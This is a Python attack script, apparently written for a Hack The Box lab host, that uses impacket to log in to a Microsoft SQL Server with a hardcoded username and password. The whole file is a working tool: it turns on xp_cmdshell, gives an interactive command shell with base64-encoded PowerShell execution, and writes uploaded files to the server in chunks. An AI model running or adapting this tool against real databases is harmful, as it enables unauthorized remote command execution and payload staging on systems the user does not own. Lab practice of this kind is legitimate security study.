# /usr/bin/env python3
# interactive xp_cmdshell
# with impacket and cmd
# used https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py for reference
import os, cmd, sys, re, base64
from impacket import tds
import readline
import argparse

class XpShell(cmd.Cmd):

    def __init__(self, SQLObj):
        cmd.Cmd.__init__(self)
        self.sql = SQLObj
        self.prompt = 'xp_cmd> '
        self.file = None
        self.pwsh = False

    def powershell_encode(self, data):
        return base64.b64encode(data.encode('UTF-16LE')).decode()

    def powershell_encode_binary(self, data):
        return base64.b64encode(data).decode()

    # interpret every line as system command
    def default(self, arg):
        try:

            if self.pwsh:
                new_arg = 'powershell -encodedCommand {}'
                arg = new_arg.format(self.powershell_encode(arg))

            self.execute_query(arg)

        except ConnectionResetError as e:
            self.reconnect_mssql()
            self.execute_query(arg)
        except Exception as e:
            print('Exception: ')
            print(str(e))
            raise e
            pass

    # i wont say what it does
    def do_exit(self, arg):
        exit()

    # ? yes
    def do_help(self, arg):
        print("""
you found the help command

pwsh                -   Toggle powershell on/off
upload <src> <dest> -   upload a file
exit                -   i wont say what it does
              """)

    def do_upload(self, data, dest):
        writeme = bytearray()  # contains bytes to be written

        try:
            # create/overwrite the target file with powershell
            cmd = 'New-Item -Path {} -Force'.format(dest)
            cmd = self.powershell_encode(cmd)
            self.execute_query('powershell -encodedCommand {}'.format(cmd))
        except FileNotFoundError as e:
            print('File not found.')
            return
        except ConnectionResetError as e:
            self.reconnect_mssql()
            self.execute_query('powershell -encodedCommand {}'.format(cmd))
        except Exception as e:
            print('Exception: ')
            print(str(e))
            return

        total_uploaded = 0  # uploaded bytes so far
        count = 0           # counter to run through byte array
        write_count = 2000  # write 2000 bytes with each command

        # run through all bytes of the file which have been saved in data
        for b in data:
            writeme.append(b)
            # write 'write_count' bytes with each command
            if count != 0 and count % write_count == 0:
                self.write_bytes_to_file(writeme, dest)

                writeme = bytearray()
                total_uploaded += write_count
                count = 0
                print('Uploaded {} of {} bytes'.format(total_uploaded,len(data)))
            count += 1

        # if there are unwritten write them
        if count > 0:
            self.write_bytes_to_file(writeme, dest)

            total_uploaded += count
            print('Uploaded {} of {} bytes'.format(total_uploaded, len(data)))

    # executed when ConnectionResetError
    def reconnect_mssql(self):
        print('connection lost attempting to reconnect...')
        self.sql.disconnect()
        ms_sql, res = connect_mssql()
        if res is True:
            self.sql = ms_sql
            print('Success!')
        else:
            print('Could not re-establish connection. Exiting.')
            exit()


    # execute xp_cmdshell command
    def execute_query(self, arg):
        self.sql.sql_query("exec master..xp_cmdshell '{}'".format(arg))
        self.sql.printReplies()
        self.sql.colMeta[0]['TypeData'] = 80*1
        self.sql.printRows()

    def do_enable_xp_cmdshell(self):
        try:
            self.sql.sql_query("exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;"
                               "exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
            self.sql.printReplies()
            self.sql.printRows()
        except Exception as e:
            raise e

    # encodes bytes as base64 and writes them to a file via powershell
    def write_bytes_to_file(self, data, target):
        data = self.powershell_encode_binary(data)

        # cmd to append bytes to file
        cmd = "powershell -command \"Add-Content -value ([Convert]::FromBase64String(\'{}\')) -encoding byte -path \'{}\'\"".format(data, target)
        cmd = self.powershell_encode(cmd)

        # execute file write
        try:
            self.execute_query('powershell -encodedCommand {}'.format(cmd))
        except ConnectionResetError as e:
            self.reconnect_mssql()

def connect_mssql(ip, port=1433, username="sa", password="", domain=""):
    # do database connection (simple for now)
    ms_sql = tds.MSSQL(ip, port)
    ms_sql.connect()
    res = ms_sql.login(database = None, username=username, password=password, domain=domain)
    ms_sql.printReplies()
    if res:
        return XpShell(ms_sql)
    else:
        return res

if __name__ == '__main__':
    # pass commands directly into powershell
    # ./xp_cmdshell.py -powershell
    # if len(sys.argv) > 1 and sys.argv[1] == '-powershell':
    #     pwsh = True

    # if connection successful
    xp_shell = connect_mssql("teignton.htb", username="webappusr", password="d65f4sd5f1s!df1fsd65f1sd")
    if isinstance(xp_shell, XpShell):
        xp_shell.do_enable_xp_cmdshell()
        xp_shell.pwsh = True
        xp_shell.cmdloop()
        xp_shell.sql.disconnect()
